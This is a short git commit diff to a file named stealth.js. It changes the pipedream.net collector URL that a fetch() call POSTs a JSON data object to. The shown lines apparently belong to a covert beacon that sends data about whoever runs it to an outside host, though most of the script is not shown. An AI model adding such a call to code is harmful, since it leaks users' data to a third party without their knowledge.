1adc3f33fc67b0bb0128f076886ef0ac27440c57
Raden Adhiyaksa Indiharto <70601366+radenadhiyaksa@users.noreply.github.com>
2025-05-20 22:46:50 +0900

    Update stealth.js

--- stealth.js
+++ stealth.js
@@ -17,7 +17,7 @@
     id: Math.random().toString(36).substring(2)
   };
 
-  fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
+  fetch("https://eo4fnrj3kpuriz4.m.pipedream.net", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(data)
